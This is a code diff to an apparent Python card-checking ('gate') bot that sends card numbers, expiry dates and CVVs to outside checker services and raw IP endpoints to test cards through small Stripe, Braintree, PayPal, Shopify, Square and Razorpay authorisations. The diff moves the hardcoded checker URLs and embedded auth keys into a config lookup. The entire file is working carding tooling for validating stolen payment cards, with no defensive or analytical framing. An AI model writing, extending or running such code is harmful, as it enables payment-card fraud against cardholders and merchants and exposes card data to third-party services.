@@ -7,6 +7,11 @@ import requests
 import time as time_module
 
 try:
+    from .gate_api_config import get_gate_cfg
+except ImportError:
+    from gate_api_config import get_gate_cfg
+
+try:
     from .gates_python import check_card_real_gate
     PYTHON_GATES_AVAILABLE = True
 except (ImportError, ModuleNotFoundError):
@@ -20,7 +25,8 @@ def check_stripe_charge_gate(cc, mm, yy, cvv):
     try:
         # Format card data
         lista = f"{cc}|{mm}|{yy}|{cvv}"
-        url = f"http://15.204.130.9:6969/check?cc={lista}"
+        base_url = get_gate_cfg("stripe_charge_url", "http://15.204.130.9:6969/check")
+        url = f"{base_url}?cc={lista}"
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
@@ -186,6 +192,12 @@ def check_stripe_mass_auth_gate(cc, mm, yy, cvv):
 NETHEREX_API_URL = "https://checker.netherex.xyz/strauth.php"
 NETHEREX_AUTH_KEY = "netherex_auth_shorien_wpxp60bhe"
 
+def _netherex_stripe_url():
+    return get_gate_cfg("netherex_stripe_url", NETHEREX_API_URL)
+
+def _netherex_stripe_key():
+    return get_gate_cfg("netherex_stripe_key", NETHEREX_AUTH_KEY)
+
 def _get_netherex_proxy():
     """Load the Stripe Auth proxy from bot settings file"""
     try:
@@ -213,7 +225,7 @@ def check_stripe_newrp_gate(cc, mm, yy, cvv):
         card_str = f"{cc}|{mm}|{year}|{cvv}"
         params = {
             "card": card_str,
-            "auth": NETHEREX_AUTH_KEY,
+            "auth": _netherex_stripe_key(),
         }
 
         proxy = _get_netherex_proxy()
@@ -224,7 +236,7 @@ def check_stripe_newrp_gate(cc, mm, yy, cvv):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         }
 
-        response = requests.get(NETHEREX_API_URL, params=params, headers=headers, timeout=30)
+        response = requests.get(_netherex_stripe_url(), params=params, headers=headers, timeout=30)
         elapsed = time_module.time() - start_time
 
         if response.status_code == 200:
@@ -280,6 +292,12 @@ def check_stripe_newrp_gate(cc, mm, yy, cvv):
 NETHEREX_SHOPIFY_URL = "https://checker.netherex.xyz/autosh.php"
 NETHEREX_SHOPIFY_AUTH = "netherex_auth_autosh"
 
+def _netherex_shopify_url():
+    return get_gate_cfg("netherex_shopify_url", NETHEREX_SHOPIFY_URL)
+
+def _netherex_shopify_key():
+    return get_gate_cfg("netherex_shopify_key", NETHEREX_SHOPIFY_AUTH)
+
 def _get_shopify_proxy():
     """Load the Shopify proxy from bot settings file"""
     try:
@@ -307,7 +325,7 @@ def check_shopify_netherex_gate(cc, mm, yy, cvv):
         card_str = f"{cc}|{mm}|{year}|{cvv}"
         params = {
             "card": card_str,
-            "auth": NETHEREX_SHOPIFY_AUTH,
+            "auth": _netherex_shopify_key(),
         }
 
         proxy = _get_shopify_proxy()
@@ -318,7 +336,7 @@ def check_shopify_netherex_gate(cc, mm, yy, cvv):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         }
 
-        response = requests.get(NETHEREX_SHOPIFY_URL, params=params, headers=headers, timeout=30)
+        response = requests.get(_netherex_shopify_url(), params=params, headers=headers, timeout=30)
         elapsed = time_module.time() - start_time
 
         if response.status_code == 200:
@@ -375,6 +393,12 @@ def check_shopify_netherex_gate(cc, mm, yy, cvv):
 RAZORPAY_API_URL = "https://api.barryxapi.xyz/razorpay"
 RAZORPAY_API_KEY = os.environ.get("RAZORPAY_API_KEY", "BRY-KESNP-TUPWH-JFOT9")
 
+def _razorpay_api_url():
+    return get_gate_cfg("razorpay_api_url", RAZORPAY_API_URL)
+
+def _razorpay_api_key():
+    return get_gate_cfg("razorpay_api_key", RAZORPAY_API_KEY)
+
 def check_razorpay_gate(cc, mm, yy, cvv):
     """Check card using Razorpay API via barryxapi.xyz"""
     start_time = time_module.time()
@@ -391,7 +415,7 @@ def check_razorpay_gate(cc, mm, yy, cvv):
         
         # Make API request with POST
         payload = {
-            "key": RAZORPAY_API_KEY,
+            "key": _razorpay_api_key(),
             "card": card,
             "amount": None,
             "site": "site",
@@ -403,7 +427,7 @@ def check_razorpay_gate(cc, mm, yy, cvv):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         }
         
-        response = requests.post(RAZORPAY_API_URL, json=payload, headers=headers, timeout=30)
+        response = requests.post(_razorpay_api_url(), json=payload, headers=headers, timeout=30)
         elapsed = time_module.time() - start_time
         
         if response.status_code == 200:
@@ -500,7 +524,7 @@ def check_braintree_gate(cc, mm, yy, cvv):
             year = yy
         
         lista = f"{cc}|{mm}|{year}|{cvv}"
-        url = f"http://194.150.166.130:5000/?cc={lista}"
+        url = f"{get_gate_cfg('stripe_charge_url2', 'http://194.150.166.130:5000/')}?cc={lista}"
         
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
         
@@ -567,9 +591,9 @@ def check_stripe_auth_gate(cc, mm, yy, cvv):
         lista_short = f"{cc}|{mm}|{yy}|{cvv}"
         
         urls = [
-            f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe_auth",
-            f"https://freechk.cards/free/stripe.php?lista={lista}",
-            f"https://api.nyvexis.com/stripeauth/?lista={lista_short}",
+            f"{get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')}?cc={lista}&gate=stripe_auth",
+            f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}",
+            f"{get_gate_cfg('nyvexis_stripe_url', 'https://api.nyvexis.com/stripeauth/')}?lista={lista_short}",
         ]
         
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
@@ -636,8 +660,8 @@ def check_stripe_amount_gate(cc, mm, yy, cvv, gate_name):
         }.get(gate_name, f'Stripe ${amount}')
         
         urls = [
-            f"https://freechk.cards/free/stripe.php?lista={lista}&amount={amount}",
-            f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe{amount}",
+            f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}&amount={amount}",
+            f"{get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')}?cc={lista}&gate=stripe{amount}",
         ]
         
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
@@ -764,6 +788,13 @@ CYBOR_STV_URLS = {
 }
 CYBOR_SHOPII_URL = 'https://cyborxchecker.com/api/autog.php'
 
+def _cybor_stv_url(version):
+    defaults = {'stv1': 'http://206.206.78.217:1011/', 'stv2': 'http://206.206.78.217:1012/', 'stv3': 'http://206.206.78.217:1013/'}
+    return get_gate_cfg(f"cybor_{version}_url", defaults.get(version, ''))
+
+def _cybor_shopii_url():
+    return get_gate_cfg("cybor_shopii_url", CYBOR_SHOPII_URL)
+
 def _parse_cybor_response(text, data, elapsed):
     """Parse response from Cybor-style API endpoints (shared logic)."""
     clean = text.strip()
@@ -803,7 +834,7 @@ def _parse_cybor_response(text, data, elapsed):
 def check_stv_gate(version, cc, mm, yy, cvv):
     """Stripe Auth V1/V2/V3 via CyborX 206.206.78.217:1011-1013"""
     start_time = time_module.time()
-    url = CYBOR_STV_URLS.get(version)
+    url = _cybor_stv_url(version)
     if not url:
         return {'status': 'error', 'message': f'Unknown Stripe version: {version}', 'time': 0}
     try:
@@ -835,7 +866,7 @@ def check_shopii_gate(pack, cc, mm, yy, cvv):
 
     try:
         params = {'card': card_str, 'pack': pack}
-        resp = requests.get(CYBOR_SHOPII_URL, params=params, headers=headers, timeout=15)
+        resp = requests.get(_cybor_shopii_url(), params=params, headers=headers, timeout=15)
         elapsed = time_module.time() - start_time
         if resp.status_code == 200 and resp.text.strip():
             low = resp.text.lower()
@@ -850,11 +881,11 @@ def check_shopii_gate(pack, cc, mm, yy, cvv):
         pass
 
     try:
-        params2 = {'card': card_str, 'auth': NETHEREX_SHOPIFY_AUTH}
+        params2 = {'card': card_str, 'auth': _netherex_shopify_key()}
         proxy = _get_shopify_proxy()
         if proxy:
             params2['proxy'] = proxy
-        resp2 = requests.get(NETHEREX_SHOPIFY_URL, params=params2, headers=headers, timeout=30)
+        resp2 = requests.get(_netherex_shopify_url(), params=params2, headers=headers, timeout=30)
         elapsed = time_module.time() - start_time
         if resp2.status_code == 200:
             try:
@@ -1283,7 +1314,7 @@ def check_approvedchkr_api(cc, mm, yy, cvv, gateway, api_key, **extra_params):
     }
     try:
         r = requests.get(
-            'https://approvedchkr.store/api/v1/check.php',
+            get_gate_cfg('approvedchkr_url', 'https://approvedchkr.store/api/v1/check.php'),
             params=params,
             headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
             timeout=30,
@@ -1378,9 +1409,9 @@ def check_pp2_gate(cc, mm, yy, cvv):
     try:
         year = f'20{yy}' if len(yy) == 2 else yy
         card_str = f'{cc}|{mm}|{year}|{cvv}'
-        params = {'card': card_str, 'auth': NETHEREX_AUTH_KEY}
+        params = {'card': card_str, 'auth': _netherex_stripe_key()}
         headers = {'User-Agent': 'Mozilla/5.0'}
-        resp = requests.get('https://checker.netherex.xyz/paypalcheck.php',
+        resp = requests.get(get_gate_cfg('netherex_paypal_url', 'https://checker.netherex.xyz/paypalcheck.php'),
                             params=params, headers=headers, timeout=30)
         elapsed = time_module.time() - start_time
         if resp.status_code == 200:
@@ -1435,52 +1466,61 @@ def check_generic_gate(gate_name, cc, mm, yy, cvv):
         lista_short = f"{cc}|{mm}|{yy}|{cvv}"
         
         # Gate-specific API endpoints mapping
+        _chg = get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')
+        _fck_st = get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')
+        _fck_bt = get_gate_cfg('freechk_braintree_url', 'https://freechk.cards/free/braintree.php')
+        _fck_sq = get_gate_cfg('freechk_square_url', 'https://freechk.cards/free/square.php')
+        _fck_pp = get_gate_cfg('freechk_paypal_url', 'https://freechk.cards/free/paypal.php')
+        _nyx_st = get_gate_cfg('nyvexis_stripe_url', 'https://api.nyvexis.com/stripeauth/')
+        _nyx_bt = get_gate_cfg('nyvexis_braintree_url', 'https://api.nyvexis.com/braintree/')
+        _nyx_pp = get_gate_cfg('nyvexis_paypal_url', 'https://api.nyvexis.com/paypal/')
+
         gate_urls = {
             'ss': [  # Stripe Auth
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe_auth",
-                f"https://freechk.cards/free/stripe.php?lista={lista}",
-                f"https://api.nyvexis.com/stripeauth/?lista={lista_short}",
+                f"{_chg}?cc={lista}&gate=stripe_auth",
+                f"{_fck_st}?lista={lista}",
+                f"{_nyx_st}?lista={lista_short}",
             ],
             'bu': [  # Braintree Auth
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=braintree",
-                f"https://freechk.cards/free/braintree.php?lista={lista}",
-                f"https://api.nyvexis.com/braintree/?lista={lista_short}",
+                f"{_chg}?cc={lista}&gate=braintree",
+                f"{_fck_bt}?lista={lista}",
+                f"{_nyx_bt}?lista={lista_short}",
             ],
             'sq': [  # Square Auth
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=square",
-                f"https://freechk.cards/free/square.php?lista={lista}",
+                f"{_chg}?cc={lista}&gate=square",
+                f"{_fck_sq}?lista={lista}",
             ],
             'pp': [  # PayPal $1
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=paypal",
-                f"https://freechk.cards/free/paypal.php?lista={lista}",
-                f"https://api.nyvexis.com/paypal/?lista={lista_short}&amount=1",
+                f"{_chg}?cc={lista}&gate=paypal",
+                f"{_fck_pp}?lista={lista}",
+                f"{_nyx_pp}?lista={lista_short}&amount=1",
             ],
             'sor': [  # Stripe $2
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe2",
-                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=2",
+                f"{_chg}?cc={lista}&gate=stripe2",
+                f"{_fck_st}?lista={lista}&amount=2",
             ],
             'st5': [  # Stripe $5
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe5",
-                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=5",
+                f"{_chg}?cc={lista}&gate=stripe5",
+                f"{_fck_st}?lista={lista}&amount=5",
             ],
             'st12': [  # Stripe $12
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe12",
-                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=12",
+                f"{_chg}?cc={lista}&gate=stripe12",
+                f"{_fck_st}?lista={lista}&amount=12",
             ],
             'str': [  # Stripe $15
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe15",
-                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=15",
+                f"{_chg}?cc={lista}&gate=stripe15",
+                f"{_fck_st}?lista={lista}&amount=15",
             ],
             'dep': [  # Stripe $49
-                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe49",
-                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=49",
+                f"{_chg}?cc={lista}&gate=stripe49",
+                f"{_fck_st}?lista={lista}&amount=49",
             ],
         }
-        
+
         # Get gate-specific URLs or use default
         urls = gate_urls.get(gate_name, [
-            f"http://15.204.130.9:6969/check?cc={lista}",
-            f"https://freechk.cards/free/stripe.php?lista={lista}",
+            f"{_chg}?cc={lista}",
+            f"{_fck_st}?lista={lista}",
         ])
         
         headers = {
